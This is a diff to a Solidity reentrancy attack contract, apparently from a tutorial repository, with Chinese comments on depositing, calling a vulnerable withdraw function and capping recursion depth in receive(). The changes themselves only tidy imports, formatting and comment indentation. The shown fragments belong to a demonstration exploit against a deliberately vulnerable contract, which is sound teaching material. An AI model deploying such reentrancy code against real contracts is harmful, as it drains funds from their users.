@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.34;
 
-import "contracts/9_reentrancy/BaseToken.sol";
+import {BaseContract} from "./BaseToken.sol";
 
 // 攻击合约
 contract ReentanceAttacker {
@@ -25,7 +25,7 @@ contract ReentanceAttacker {
         // 先存再取
         baseContract.deposit{value: msg.value}();
         baseContract.vulnerableWithdraw();
-        (bool success, ) = msg.sender.call{value: msg.value}("");
+        (bool success,) = msg.sender.call{value: msg.value}("");
         require(success, "call failed");
     }
 
@@ -36,7 +36,7 @@ contract ReentanceAttacker {
         baseContract.deposit{value: msg.value}();
         baseContract.safeWithdraw();
         // 用户存入的直接取回
-        (bool success, ) = msg.sender.call{value: msg.value}("");
+        (bool success,) = msg.sender.call{value: msg.value}("");
         require(success, "call failed");
     }
 
@@ -47,7 +47,7 @@ contract ReentanceAttacker {
         baseContract.deposit{value: msg.value}();
         baseContract.safeWithdraw();
         // 用户存入的直接取回
-        (bool success, ) = msg.sender.call{value: msg.value}("");
+        (bool success,) = msg.sender.call{value: msg.value}("");
         require(success, "call failed");
     }
 
@@ -55,7 +55,7 @@ contract ReentanceAttacker {
     receive() external payable {
         // 控制重入的深度=相当于控制递归的深度,不然就是无限递归了
         unchecked {
-            //这里肯定不会溢出,也就是循环两次
+        //这里肯定不会溢出,也就是循环两次
             cycle++;
         }
 
